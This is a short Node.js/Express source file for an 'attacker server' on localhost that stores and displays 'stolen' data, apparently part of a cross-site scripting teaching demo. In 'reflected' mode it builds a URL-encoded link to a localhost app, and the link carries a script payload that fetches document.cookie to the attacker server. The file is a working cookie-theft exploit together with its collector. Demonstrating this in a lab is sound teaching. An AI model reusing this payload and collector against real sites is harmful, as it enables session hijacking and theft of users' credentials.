const express = require('express');
const cors = require('cors');
const port = 4000;

const app = express();
const stolenData = [];
let maliciousLink = '';

app.use(cors());

app.set('views', './views');
app.set('view engine', 'ejs');

app.use(express.static('public'));

app.get('/', function(req, res) {
  console.log(req.query.data);
  if (req.query.data) stolenData.push(req.query.data);
  maliciousLink = req.query.mode == "reflected"? 'http://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E' : '';

  res.render('index', {
    stolenData: (stolenData.length > 0 ? stolenData : ['No data, yet!']),
    maliciousLink
  });
});

app.listen(port, () => console.log(`Attacker server listening at localhost:${port}`));